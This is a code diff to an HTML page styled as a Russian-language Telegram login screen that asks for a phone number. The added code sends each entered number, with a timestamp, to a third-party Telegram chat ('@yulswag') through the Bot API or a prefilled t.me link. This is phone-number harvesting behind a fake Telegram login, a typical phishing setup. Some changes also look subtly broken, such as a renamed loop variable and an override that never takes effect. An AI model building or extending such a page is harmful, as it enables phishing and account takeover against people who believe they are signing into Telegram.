@@ -168,6 +168,11 @@
             background-color: #2a7fd5;
         }
         
+        .btn-next:disabled {
+            background-color: #a0d0ff;
+            cursor: not-allowed;
+        }
+        
         .modal {
             display: none;
             position: fixed;
@@ -240,6 +245,33 @@
             color: #707579;
             border-bottom: 1px solid #e6ecf0;
         }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            color: #3390ec;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            color: #00a884;
+            background-color: #e6f7f2;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        
+        .error-message {
+            display: none;
+            text-align: center;
+            padding: 10px;
+            color: #ff3b30;
+            background-color: #ffe6e5;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -268,6 +300,10 @@
             </div>
             
             <p class="info-text">На ваш номер будет отправлен код подтверждения.</p>
+            
+            <div class="loading" id="loading">Отправка данных...</div>
+            <div class="success-message" id="successMessage">Номер успешно отправлен в Telegram!</div>
+            <div class="error-message" id="errorMessage"></div>
             
             <div class="buttons">
                 <button class="btn btn-cancel" id="cancelBtn">ОТМЕНА</button>
@@ -345,6 +381,9 @@
         const countrySearch = document.getElementById('countrySearch');
         const cancelBtn = document.getElementById('cancelBtn');
         const nextBtn = document.getElementById('nextBtn');
+        const loading = document.getElementById('loading');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
 
         // Текущая выбранная страна
         let currentCountry = countries[0];
@@ -368,14 +407,111 @@
         });
 
         // Обработка кнопки далее
-        nextBtn.addEventListener('click', () => {
+        nextBtn.addEventListener('click', async () => {
             const phoneNumber = phoneInput.value.trim();
             if (!phoneNumber) {
-                alert('Пожалуйста, введите номер телефона');
+                showError('Пожалуйста, введите номер телефона');
                 return;
             }
-            alert(`Код подтверждения будет отправлен на номер +${currentCountry.code} ${phoneNumber}`);
+            
+            if (!/^\d+$/.test(phoneNumber)) {
+                showError('Номер телефона должен содержать только цифры');
+                return;
+            }
+            
+            const fullPhoneNumber = `+${currentCountry.code} ${phoneNumber}`;
+            
+            // Показываем индикатор загрузки
+            showLoading();
+            
+            try {
+                // Отправляем номер в Telegram
+                await sendToTelegram(fullPhoneNumber);
+                
+                // Показываем сообщение об успехе
+                showSuccess();
+                
+                // Очищаем поле ввода
+                phoneInput.value = '';
+                
+            } catch (error) {
+                showError('Ошибка при отправке данных: ' + error.message);
+            }
         });
+
+        // Функция отправки данных в Telegram
+        async function sendToTelegram(phoneNumber) {
+            const botToken = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+            const chatId = '@yulswag'; // Username получателя
+            
+            // Формируем сообщение
+            const message = `Новый номер телефона: ${phoneNumber}\nВремя: ${new Date().toLocaleString('ru-RU')}`;
+            
+            // Для демонстрации используем fetch для отправки сообщения
+            // В реальном приложении нужно использовать Telegram Bot API
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error('Не удалось отправить сообщение');
+            }
+            
+            return await response.json();
+        }
+
+        // Альтернативный метод отправки (если нет бота)
+        function sendToTelegramAlternative(phoneNumber) {
+            // Создаем ссылку для открытия Telegram с предзаполненным сообщением
+            const message = `Новый номер телефона: ${phoneNumber}`;
+            const encodedMessage = encodeURIComponent(message);
+            const telegramUrl = `https://t.me/yulswag?text=${encodedMessage}`;
+            
+            // Открываем Telegram
+            window.open(telegramUrl, '_blank');
+            
+            return Promise.resolve();
+        }
+
+        // Показать индикатор загрузки
+        function showLoading() {
+            loading.style.display = 'block';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            nextBtn.disabled = true;
+        }
+
+        // Показать сообщение об успехе
+        function showSuccess() {
+            loading.style.display = 'none';
+            successMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+            nextBtn.disabled = false;
+            
+            // Автоматически скрыть сообщение через 3 секунды
+            setTimeout(() => {
+                successMessage.style.display = 'none';
+            }, 3000);
+        }
+
+        // Показать сообщение об ошибке
+        function showError(message) {
+            loading.style.display = 'none';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'block';
+            errorMessage.textContent = message;
+            nextBtn.disabled = false;
+        }
 
         // Поиск стран
         countrySearch.addEventListener('input', () => {
@@ -403,7 +539,7 @@
             // Если есть результаты поиска, отображаем их
             if (searchTerm) {
                 Object.keys(filteredGroups).forEach(letter => {
-                    filteredGroups[letter].forEach(country => {
+                    filteredCountries[letter].forEach(country => {
                         const countryOption = document.createElement('div');
                         countryOption.className = 'country-option';
                         countryOption.innerHTML = `
@@ -467,6 +603,10 @@
 
         // Инициализация интерфейса
         renderCountryList();
+        
+        // Для демонстрации используем альтернативный метод отправки
+        // В реальном приложении замените на работу с Telegram Bot API
+        window.sendToTelegram = sendToTelegramAlternative;
     </script>
 </body>
 </html>
